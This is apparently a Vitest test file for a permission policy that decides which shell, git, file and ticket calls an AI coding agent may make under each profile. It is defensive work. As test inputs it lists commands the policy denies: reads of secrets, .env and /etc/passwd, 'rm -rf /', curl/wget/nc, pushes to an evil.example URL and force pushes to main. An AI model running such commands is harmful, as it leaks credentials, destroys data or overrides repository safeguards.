import { describe, expect, it } from "vitest";
import {
  buildPolicy,
  evaluate,
  globToRegExp,
  PROFILES,
  type Decision,
  type Layout,
  type Policy,
  type Profile,
  type ToolCall,
} from "../index.js";

const layout: Layout = {
  home: "/home/agent",
  workDir: "/work/main",
  reposDir: "/work/repos",
  worktreesDir: "/work/worktrees",
  scratchDir: "/work/scratch",
  memoryDir: "/work/memory",
  secretsDir: "/work/secrets",
};

const repo = (name: string, kind: "primary" | "baseline" | "infra" | "other", branch = "main") => ({
  name,
  url: `github.com/acme/${name}`,
  kind,
  default_branch: branch,
});

const team = {
  repos: [
    repo("app", "primary"),
    repo("site", "other"),
    repo("legacy", "baseline", "develop"),
    repo("ops", "infra"),
  ],
};

const dev = { repos: { app: "write", site: "read", "kind:baseline": "read" } as const };

const policy = (
  profile: Profile,
  person: { repos: Record<string, "read" | "write"> } = dev,
): Policy => buildPolicy({ profile, person, team, layout });

type Row = [
  name: string,
  profile: Profile,
  call: Partial<ToolCall> & Pick<ToolCall, "kind">,
  effect: Decision["effect"],
  rule?: string,
];
const APP = "/work/worktrees/app/feat";

const sh = (
  command: string,
  cwd = APP,
  extra: Partial<ToolCall> = {},
): Partial<ToolCall> & Pick<ToolCall, "kind"> => ({ kind: "shell", command, cwd, ...extra });

const rows: Row[] = [
  // tools
  [
    "readonly has no write tool",
    "readonly",
    { kind: "write", path: `${APP}/a.ts` },
    "deny",
    "tools.allow",
  ],
  ["readonly has no web_fetch", "readonly", { kind: "web_fetch" }, "deny", "tools.allow"],
  ["code may use subagents", "code", { kind: "subagent" }, "allow"],
  ["ost is available to everyone", "readonly", { kind: "ost", command: "ticket.comment" }, "allow"],
  // chat sessions: read the repositories and the office, change nothing but comments and new tickets
  ["chat reads a granted worktree", "chat", { kind: "read", path: `${APP}/src/a.ts` }, "allow"],
  ["chat reads a granted clone", "chat", { kind: "read", path: "/work/repos/site/a.ts" }, "allow"],
  ["chat has no write tool", "chat", { kind: "write", path: `${APP}/a.ts` }, "deny", "tools.allow"],
  ["chat has no edit tool", "chat", { kind: "edit", path: `${APP}/a.ts` }, "deny", "tools.allow"],
  ["chat has no subagents", "chat", { kind: "subagent" }, "deny", "tools.allow"],
  ["chat may list files", "chat", sh("ls src"), "allow"],
  ["chat may read git history", "chat", sh("git log --oneline"), "allow"],
  ["chat may not push", "chat", sh("git push origin HEAD"), "deny"],
  ["chat may not commit", "chat", sh("git commit -m x"), "deny"],
  // Not covered by the policy: an unattended runtime treats `ask` as a refusal.
  ["chat may not touch files", "chat", sh("touch a.txt"), "ask"],
  ["chat may not redirect into a file", "chat", sh("echo hi > a.txt"), "deny"],
  ["chat may comment on a ticket", "chat", { kind: "ost", command: "ticket.comment" }, "allow"],
  ["chat may create a ticket", "chat", { kind: "ost", command: "ticket.create" }, "allow"],
  ["chat may file a request", "chat", { kind: "ost", command: "work.queue" }, "allow"],
  ["chat may attach a request", "chat", { kind: "ost", command: "work.attach" }, "allow"],
  ["chat may comment on a pull request", "chat", { kind: "ost", command: "pr.comment" }, "allow"],
  [
    "chat may not open a pull request",
    "chat",
    { kind: "ost", command: "pr.open" },
    "deny",
    "ost.verbs",
  ],
  [
    "chat may not review a pull request",
    "chat",
    { kind: "ost", command: "pr.review" },
    "deny",
    "ost.verbs",
  ],
  [
    "chat may not move a ticket",
    "chat",
    { kind: "ost", command: "ticket.move" },
    "deny",
    "ost.verbs",
  ],
  [
    "chat may not assign a ticket",
    "chat",
    { kind: "ost", command: "ticket.assign" },
    "deny",
    "ost.verbs",
  ],
  ["chat may not move work", "chat", { kind: "ost", command: "work.move" }, "deny", "ost.verbs"],
  [
    "chat may not write a document",
    "chat",
    { kind: "ost", command: "doc.create" },
    "deny",
    "ost.verbs",
  ],
  ["chat needs a verb name", "chat", { kind: "ost" }, "deny", "ost.verbs"],
  // read paths
  [
    "read a file in a granted worktree",
    "readonly",
    { kind: "read", path: `${APP}/src/a.ts` },
    "allow",
  ],
  [
    "read in a read-granted repo clone",
    "code",
    { kind: "read", path: "/work/repos/site/README.md" },
    "allow",
  ],
  [
    "read in an ungranted repo",
    "code",
    { kind: "read", path: "/work/repos/ops/main.tf" },
    "deny",
    "paths.read.outside",
  ],
  [
    "read the secrets dir",
    "code",
    { kind: "read", path: "/work/secrets/token" },
    "deny",
    "paths.read.deny",
  ],
  [
    "read .env in a worktree",
    "code",
    { kind: "read", path: `${APP}/.env` },
    "deny",
    "paths.read.deny",
  ],
  [
    "read a pem file",
    "code",
    { kind: "read", path: `${APP}/certs/server.pem` },
    "deny",
    "paths.read.deny",
  ],
  [
    "read home dotfiles",
    "code",
    { kind: "read", path: "/home/agent/.ssh/id_rsa" },
    "deny",
    "paths.read.outside",
  ],
  ["read memory", "readonly", { kind: "read", path: "/work/memory/journal.md" }, "allow"],
  [
    "read .. escape is normalised",
    "code",
    { kind: "read", path: `${APP}/../../../secrets/x` },
    "deny",
    "paths.read.deny",
  ],
  ["relative read uses cwd", "code", { kind: "read", path: "src/a.ts", cwd: APP }, "allow"],
  ["search without a path", "readonly", { kind: "search" }, "allow"],
  ["tilde read of .env", "code", { kind: "read", path: "~/.env" }, "deny", "paths.read.deny"],
  // write paths
  ["code writes in a write worktree", "code", { kind: "edit", path: `${APP}/src/a.ts` }, "allow"],
  [
    "code cannot write a read repo worktree",
    "code",
    { kind: "write", path: "/work/worktrees/site/a.ts" },
    "deny",
    "paths.write.outside",
  ],
  [
    "code cannot write the repo clone",
    "code",
    { kind: "write", path: "/work/repos/app/a.ts" },
    "deny",
    "paths.write.outside",
  ],
  ["code writes scratch", "code", { kind: "write", path: "/work/scratch/n.txt" }, "allow"],
  [
    "code cannot write .git",
    "code",
    { kind: "write", path: `${APP}/.git/hooks/pre-commit` },
    "deny",
    "paths.write.deny",
  ],
  [
    "code cannot write .env",
    "code",
    { kind: "write", path: `${APP}/.env` },
    "deny",
    "paths.write.deny",
  ],
  ["docs writes markdown", "docs", { kind: "edit", path: `${APP}/README.md` }, "allow"],
  ["docs writes under docs/", "docs", { kind: "write", path: `${APP}/docs/img/a.svg` }, "allow"],
  [
    "docs cannot write source",
    "docs",
    { kind: "edit", path: `${APP}/src/a.ts` },
    "deny",
    "paths.write.outside",
  ],
  ["docs writes memory", "docs", { kind: "write", path: "/work/memory/n.md" }, "allow"],
  ["infra writes in worktree", "infra", { kind: "edit", path: `${APP}/main.tf` }, "allow"],
  // shell: read-only utilities and paths
  ["ls in a worktree", "code", sh("ls -la src"), "allow"],
  ["cat secrets/x", "code", sh("cat secrets/x", "/work"), "deny", "paths.read.deny"],
  ["cat absolute secrets", "readonly", sh("cat /work/secrets/key"), "deny", "paths.read.deny"],
  ["cat .env", "code", sh("cat .env"), "deny", "paths.read.deny"],
  ["cat ~/.env", "code", sh("cat ~/.env"), "deny", "paths.read.deny"],
  ["echo $(cat ~/.env)", "code", sh("echo $(cat ~/.env)"), "deny", "shell.unparseable"],
  ["backticks", "code", sh("echo `whoami`"), "deny", "shell.unparseable"],
  ["variable expansion", "code", sh("cat $HOME/.env"), "deny", "shell.unparseable"],
  ["single-quoted dollar is fine", "code", sh("grep 'a$' src/a.ts"), "allow"],
  ["grep piped to head", "readonly", sh("grep -rn TODO src | head -5"), "allow"],
  ["cat outside allowed paths", "code", sh("cat /etc/passwd"), "deny", "paths.read.outside"],
  ["find -exec", "code", sh("find . -name x -exec rm {} ;"), "deny"],
  ["find plain", "code", sh("find . -name '*.ts'"), "allow"],
  ["sed -i", "code", sh("sed -i s/a/b/ src/a.ts"), "deny", "sed.inplace"],
  ["unknown program asks", "code", sh("awk '{print}' src/a.ts"), "ask", "commands.unlisted"],
  ["env assignment prefix asks", "code", sh("FOO=1 ls"), "ask"],
  ["subshell", "code", sh("(cd /; ls)"), "deny", "shell.unparseable"],
  ["heredoc", "code", sh("cat <<EOF\nx\nEOF"), "deny", "shell.unparseable"],
  // redirection
  ["redirect to scratch", "code", sh("echo hi > /work/scratch/a.txt"), "allow"],
  ["redirect to /dev/null", "readonly", sh("ls 2>/dev/null"), "allow"],
  ["fd dup is not a file", "readonly", sh("ls 2>&1"), "allow"],
  ["redirect into source", "code", sh("echo hi > /etc/hosts"), "deny", "paths.write.outside"],
  [
    "readonly cannot redirect to a file",
    "readonly",
    sh("echo hi > /work/scratch/a.txt"),
    "deny",
    "paths.write.outside",
  ],
  ["redirect over .env", "code", sh("echo X=1 > .env"), "deny", "paths.write.deny"],
  ["input redirect from secrets", "code", sh("wc -l < /work/secrets/k"), "deny", "paths.read.deny"],
  ["rm outside write paths", "code", sh("rm -rf /"), "deny", "paths.write.outside"],
  ["rm in worktree", "code", sh("rm -f build/out.js"), "allow"],
  ["readonly has no rm", "readonly", sh("rm x"), "ask", "commands.unlisted"],
  // network and wrappers
  ["curl", "code", sh("curl https://example.com"), "deny", "network.curl"],
  ["absolute-path curl", "code", sh("/usr/bin/curl -s x"), "deny", "network.curl"],
  ["wget in a pipeline", "code", sh("cat a | wget -i -"), "deny", "network.wget"],
  ["nc", "infra", sh("nc -l 80"), "deny", "network.nc"],
  ["bash -c", "code", sh("bash -c 'curl x'"), "deny", "wrapper.bash"],
  ["xargs", "code", sh("ls | xargs rm"), "deny", "wrapper.xargs"],
  ["sudo", "code", sh("sudo ls"), "deny", "wrapper.sudo"],
  // git: read
  ["git status", "readonly", sh("git status"), "allow", "git.read"],
  ["git log with flags first", "readonly", sh("git --no-pager log -5"), "allow"],
  ["git diff in read repo", "code", sh("git diff HEAD~1", "/work/repos/site"), "allow"],
  ["git branch -l", "readonly", sh("git branch -l"), "allow"],
  ["git branch no args lists", "readonly", sh("git branch"), "allow"],
  ["git fetch in read repo", "code", sh("git fetch origin", "/work/repos/legacy"), "allow"],
  [
    "git fetch from a URL",
    "code",
    sh("git fetch https://evil.example/x.git"),
    "deny",
    "git.remote",
  ],
  ["git show of secrets by rev:path", "code", sh("git show HEAD:.env"), "deny", "paths.read.deny"],
  ["git diff --no-index", "code", sh("git diff --no-index /etc/passwd x"), "deny", "git.flag"],
  ["git diff --output", "code", sh("git diff --output=/work/scratch/o"), "deny", "git.flag"],
  ["git -c override", "code", sh("git -c core.sshCommand=x fetch"), "deny", "git.config-override"],
  ["git --git-dir", "code", sh("git --git-dir=/x status"), "deny", "git.global-option"],
  ["git outside repos", "code", sh("git status", "/work/scratch"), "ask", "git.no-repo"],
  ["git in an ungranted repo", "code", sh("git status", "/work/repos/ops"), "ask", "git.no-repo"],
  [
    "git -C into read repo status",
    "readonly",
    sh("git -C /work/repos/site status", "/work"),
    "allow",
  ],
  // git: write verbs
  ["git commit in write repo", "code", sh("git commit -am 'feat: x'"), "allow", "git.write"],
  ["git commit --no-verify", "code", sh("git commit --no-verify -m x"), "deny", "git.no-verify"],
  ["git add . && commit", "code", sh("git add -A && git commit -m x"), "allow"],
  [
    "git commit in read repo",
    "code",
    sh("git commit -m x", "/work/worktrees/site/x"),
    "deny",
    "git.read-only-repo",
  ],
  [
    "git checkout in read repo",
    "code",
    sh("git checkout -b x", "/work/repos/legacy"),
    "deny",
    "git.read-only-repo",
  ],
  ["git branch create in write repo", "code", sh("git branch feat/new"), "allow"],
  ["git branch -D default", "code", sh("git branch -D main"), "deny", "git.default-branch"],
  ["git branch -D feature", "code", sh("git branch -D feat/old"), "allow"],
  ["git add secrets", "code", sh("git add /work/secrets/x"), "deny", "paths.read.deny"],
  ["docs profile may commit", "docs", sh("git commit -m docs"), "allow"],
  [
    "readonly profile caps write grants",
    "readonly",
    sh("git commit -m x"),
    "deny",
    "git.read-only-repo",
  ],
  [
    "git remote add asks",
    "code",
    sh("git remote add x https://e.example/r.git"),
    "ask",
    "git.unsupported",
  ],
  ["git remote -v", "code", sh("git remote -v"), "allow"],
  ["git stash list", "readonly", sh("git stash list"), "allow"],
  ["git stash push in write repo", "code", sh("git stash push"), "allow"],
  ["git worktree add", "code", sh("git worktree add ../x -b y", "/work/repos/app"), "allow"],
  // git: push
  ["git push to feature", "code", sh("git push origin feat/x"), "allow", "git.push"],
  ["git push -u", "code", sh("git push -u origin feat/x"), "allow"],
  [
    "git push --force-with-lease",
    "code",
    sh("git push --force-with-lease origin feat"),
    "allow",
    "git.push.lease",
  ],
  [
    "git push --force-with-lease=ref:sha",
    "code",
    sh("git push --force-with-lease=feat:abc123 origin feat"),
    "allow",
    "git.push.lease",
  ],
  [
    "git push branch with force in the name",
    "code",
    sh("git push origin feature/force-notes"),
    "allow",
    "git.push",
  ],
  ["git push branch with -f in the name", "code", sh("git push origin fix/-f-flag"), "allow"],
  ["git push --force", "code", sh("git push --force origin feat"), "deny", "git.push.force"],
  ["git push -f", "code", sh("git push -f origin feat"), "deny", "git.push.force"],
  ["git push -fu cluster", "code", sh("git push -fu origin feat"), "deny", "git.push.force"],
  ["git push origin +feat", "code", sh("git push origin +feat"), "deny", "git.push.force"],
  [
    "git push origin +HEAD:feat",
    "code",
    sh("git push origin +HEAD:feat"),
    "deny",
    "git.push.force",
  ],
  ["git push --mirror", "code", sh("git push --mirror"), "deny", "git.push.mirror"],
  ["git push --all", "code", sh("git push --all origin"), "deny", "git.push.mirror"],
  ["git push origin main", "code", sh("git push origin main"), "deny", "git.push.default-branch"],
  [
    "git push origin HEAD:main",
    "code",
    sh("git push origin HEAD:main"),
    "deny",
    "git.push.default-branch",
  ],
  [
    "git push origin x:main",
    "code",
    sh("git push origin x:main"),
    "deny",
    "git.push.default-branch",
  ],
  [
    "git push origin feat:refs/heads/main",
    "code",
    sh("git push origin feat:refs/heads/main"),
    "deny",
    "git.push.default-branch",
  ],
  [
    "git push origin :main deletes default",
    "code",
    sh("git push origin :main"),
    "deny",
    "git.push.default-branch",
  ],
  [
    "git push --delete origin main",
    "code",
    sh("git push --delete origin main"),
    "deny",
    "git.push.default-branch",
  ],
  ["git push --delete origin feature", "code", sh("git push --delete origin feat/old"), "allow"],
  [
    "git -C /x push origin HEAD:main",
    "code",
    sh("git -C /work/repos/app push origin HEAD:main", "/work"),
    "deny",
    "git.push.default-branch",
  ],
  [
    "git -C into worktree push feature",
    "code",
    sh("git -C /work/worktrees/app/feat push origin feat", "/work"),
    "allow",
  ],
  [
    "cd repo && git push -f",
    "code",
    sh("cd /work/repos/app && git push -f", "/work"),
    "deny",
    "git.push.force",
  ],
  [
    "cd repo && git push origin main",
    "code",
    sh("cd repos/app && git push origin main", "/work"),
    "deny",
    "git.push.default-branch",
  ],
  [
    "cd read repo && git push",
    "code",
    sh("cd /work/repos/site && git push origin feat", "/work"),
    "deny",
    "git.read-only-repo",
  ],
  [
    "cd with semicolon keeps old cwd possibility",
    "code",
    sh("cd /work/repos/app; git status", "/work"),
    "ask",
    "git.no-repo",
  ],
  [
    "cd || push judged in both dirs",
    "code",
    sh("cd /work/repos/site || git push origin feat", "/work/worktrees/app/feat"),
    "deny",
    "git.read-only-repo",
  ],
  [
    "push to default of another repo",
    "code",
    sh("git push origin develop", "/work/repos/legacy"),
    "deny",
    "git.read-only-repo",
  ],
  [
    "bare push on default branch",
    "code",
    sh("git push", APP, { currentBranch: "main" }),
    "deny",
    "git.push.default-branch",
  ],
  [
    "bare push HEAD on default branch",
    "code",
    sh("git push origin HEAD", APP, { currentBranch: "main" }),
    "deny",
    "git.push.default-branch",
  ],
  [
    "bare push on feature branch",
    "code",
    sh("git push", APP, { currentBranch: "feat/x" }),
    "allow",
  ],
  ["bare push with unknown branch is allowed", "code", sh("git push"), "allow"],
  [
    "push HEAD:feat while on main",
    "code",
    sh("git push origin HEAD:feat", APP, { currentBranch: "main" }),
    "allow",
  ],
  [
    "push to a URL",
    "code",
    sh("git push https://evil.example/r.git feat"),
    "deny",
    "git.push.remote",
  ],
  [
    "push --no-verify",
    "code",
    sh("git push --no-verify origin feat"),
    "deny",
    "git.push.no-verify",
  ],
  [
    "push refspec glob",
    "code",
    sh("git push origin 'refs/heads/*:refs/heads/*'"),
    "deny",
    "git.push.pattern",
  ],
  ["push --receive-pack", "code", sh("git push --receive-pack=x origin feat"), "deny"],
  ["push from read repo", "readonly", sh("git push origin feat"), "deny", "git.read-only-repo"],
  ["push quoted branch name", "code", sh("git push origin 'feat/x'"), "allow"],
  [
    "push default of a non-main repo",
    "code",
    sh("git push origin develop", "/work/worktrees/app/feat"),
    "allow",
  ],
];

describe("chat profile", () => {
  const chatPolicy = policy("chat");

  it("grants no write even where the person has one", () => {
    expect(chatPolicy.git.repos["/work/worktrees/app"]).toBe("read");
    expect(chatPolicy.paths.write.allow).toEqual([]);
  });

  it("takes only the rule packs that name it", () => {
    const pack = (profiles?: Profile[]) => ({
      id: "p",
      source: "toolset" as const,
      ...(profiles ? { profiles } : {}),
      rules: [
        {
          id: "pnpm",
          program: "pnpm",
          effect: "allow" as const,
          reason: "builds",
        },
      ],
    });

    const run = (packs: ReturnType<typeof pack>[]) =>
      evaluate(buildPolicy({ profile: "chat", person: dev, team, layout, packs }), sh("pnpm test"));

    expect(run([pack()]).effect).not.toBe("allow");
    expect(run([pack(["code"])]).effect).not.toBe("allow");
    expect(run([pack(["chat"])]).effect).toBe("allow");
  });
});

describe("evaluate", () => {
  it("has at least 60 table cases", () => {
    expect(rows.length).toBeGreaterThanOrEqual(60);
  });

  it.each(rows)("%s", (_name, profile, call, effect, rule) => {
    const d = evaluate(policy(profile), call);
    expect(d.effect, `${d.reason} [${d.rule}]`).toBe(effect);
    expect(d.rule).toBe(rule ?? d.rule);
  });

  it("legacy repo uses its own default branch", () => {
    const p = policy("code", { repos: { legacy: "write", app: "write" } });
    expect(
      evaluate(p, { kind: "shell", command: "git push origin develop", cwd: "/work/repos/legacy" })
        .rule,
    ).toBe("git.push.default-branch");

    expect(
      evaluate(p, { kind: "shell", command: "git push origin main", cwd: "/work/repos/legacy" })
        .effect,
    ).toBe("allow");
  });
});

describe("buildPolicy", () => {
  it("is plain data", () => {
    const p = policy("code");
    expect(JSON.parse(JSON.stringify(p))).toEqual(p);
  });

  it.each(PROFILES)("%s denies raw network and secrets", (profile) => {
    const p = policy(profile);
    expect(p.network.raw).toBe("deny");
    expect(p.paths.read.deny).toEqual(
      expect.arrayContaining(["/work/secrets/**", "**/.env", "**/*.pem"]),
    );

    expect(evaluate(p, { kind: "shell", command: "curl x", cwd: "/work" }).effect).toBe("deny");
  });

  it("maps grants to git modes with name, kind and wildcard precedence", () => {
    const p = policy("code", { repos: { "*": "read", "kind:primary": "write", site: "write" } });
    expect(p.git.repos).toMatchObject({
      "/work/repos/app": "write",
      "/work/worktrees/app": "write",
      "/work/repos/site": "write",
      "/work/repos/legacy": "read",
      "/work/repos/ops": "read",
    });

    expect(p.git.defaultBranches["/work/repos/legacy"]).toBe("develop");
  });

  it("gives no access without a grant", () => {
    const p = policy("code", { repos: {} });
    expect(p.git.repos).toEqual({});
    expect(evaluate(p, { kind: "read", path: "/work/repos/app/a.ts" }).effect).toBe("deny");
  });

  describe("reads below the base directories", () => {
    it.each([
      "/work/main/references/x.md",
      "/work/repos/app/README.md",
      "/work/worktrees/app/feat/src/a.ts",
    ])("allows reading %s", (path) => {
      for (const profile of PROFILES) {
        const d = evaluate(policy(profile), { kind: "read", path });
        expect(`${d.effect} ${path}`).toBe(`allow ${path}`);
      }
    });

    it("denies siblings outside the base directories", () => {
      const d = evaluate(policy("code"), { kind: "read", path: "/etc/hosts" });
      expect(d.effect).toBe("deny");
      expect(d.rule).toBe("paths.read.outside");
    });

    it.each([
      ["a secret file", "/work/secrets/token"],
      ["a .env in a worktree", "/work/worktrees/app/feat/.env"],
      ["a .env in the workdir", "/work/main/.env"],
      ["a .env in a repo clone", "/work/repos/app/.env"],
    ])("still denies %s", (_n, path) => {
      const d = evaluate(policy("code"), { kind: "read", path });
      expect(d.effect).toBe("deny");
      expect(d.rule).toBe("paths.read.deny");
    });
  });

  it("denies a path under reposDir that is not a team repo", () => {
    const d = evaluate(policy("code"), { kind: "read", path: "/work/repos/unknown/a.ts" });
    expect(d.effect).toBe("deny");
    expect(d.rule).toBe("paths.read.outside");
  });

  it.each(["reposDir", "worktreesDir", "secretsDir"] as const)(
    "refuses a layout with %s inside workDir",
    (key) => {
      const bad = { ...layout, [key]: "/work/main/inner" };
      expect(() => buildPolicy({ profile: "code", person: dev, team, layout: bad })).toThrow(
        /inside workDir/,
      );
    },
  );

  it("readonly caps write grants at read", () => {
    expect(Object.values(policy("readonly").git.repos)).not.toContain("write");
  });
});

describe("globToRegExp", () => {
  it.each([
    ["/a/**", "/a", true],
    ["/a/**", "/a/b/c", true],
    ["/a/**", "/ab", false],
    ["**/.env", "/x/y/.env", true],
    ["**/.env", "/.env", true],
    ["**/.env", "/x/.env.example", false],
    ["/a/*", "/a/b/c", false],
    ["**/*.pem", "/a/b/k.pem", true],
  ])("%s vs %s", (glob, path, ok) => {
    expect(globToRegExp(glob).test(path)).toBe(ok);
  });
});

describe("design.canvas", () => {
  const designer = buildPolicy({
    profile: "docs",
    person: { repos: {} },
    team,
    layout,
    capabilities: ["design.canvas"],
  });

  const developer = policy("code");

  it("adds the artifact tool and the artifacts folder for a role with the capability", () => {
    expect(designer.tools.allow).toContain("artifact");
    expect(evaluate(designer, { kind: "artifact" }).effect).toBe("allow");
    expect(designer.paths.write.allow).toContain("/home/agent/artifacts/**");
    expect(designer.paths.read.allow).toContain("/home/agent/artifacts/**");
    expect(
      evaluate(designer, { kind: "write", path: "/home/agent/artifacts/home.html" }).effect,
    ).toBe("allow");
  });

  it("keeps them away from the other roles", () => {
    expect(developer.tools.allow).not.toContain("artifact");
    expect(evaluate(developer, { kind: "artifact" })).toMatchObject({
      effect: "deny",
      rule: "tools.allow",
    });

    expect(
      evaluate(developer, { kind: "write", path: "/home/agent/artifacts/home.html" }).effect,
    ).toBe("deny");
  });

  it("limits what an artifact call may publish to files the role can read", () => {
    expect(evaluate(designer, { kind: "artifact", path: "/work/secrets/key" }).effect).toBe("deny");
    expect(
      evaluate(designer, { kind: "artifact", paths: ["/home/agent/artifacts/a.css"] }).effect,
    ).toBe("allow");
  });
});
